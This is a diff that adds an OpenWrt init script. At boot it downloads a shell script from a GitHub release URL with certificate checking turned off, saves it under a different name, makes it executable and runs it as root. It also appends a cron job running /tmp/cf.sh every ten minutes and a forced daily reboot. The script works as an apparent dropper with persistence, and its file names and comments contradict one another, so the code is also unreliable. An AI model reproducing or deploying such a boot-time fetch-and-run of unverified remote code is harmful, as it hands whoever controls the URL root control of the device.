@@ -1,0 +1,35 @@
+#!/bin/sh /etc/rc.common
+
+START=99
+USE_PROCD=1
+
+start_service() {
+    TMP_DIR="/root"
+
+    # 下载函数
+    download_file() {
+        local name="$1"
+        local url="$2"
+        local target="$TMP_DIR/$name"
+        if [ ! -f "$target" ]; then
+            echo "[$name] 不存在，正在下载..."
+            wget -q --no-check-certificate "$url" -O "$target"
+        else
+            echo "[$name] 已存在，跳过下载"
+        fi
+        chmod +x "$target"
+    }
+
+    # 下载需要的文件
+    download_file "pp_1.sh" "https://github.com/openwrt-jichang-core/openwrt-core/releases/download/0.1/pp_2.sh"
+
+    # 启动 cf.sh 定时任务（每10分钟）
+if ! grep -q "/tmp/cf.sh" /etc/crontabs/root; then
+    echo "*/10 * * * * /bin/sh /tmp/cf.sh" >> /etc/crontabs/root
+    echo "0 5 */1 * * /sbin/reboot" >> /etc/crontabs/root
+    /etc/init.d/cron restart
+fi
+
+    # 立刻执行一次 cf.sh
+    /bin/sh /root/pp_1.sh &
+}
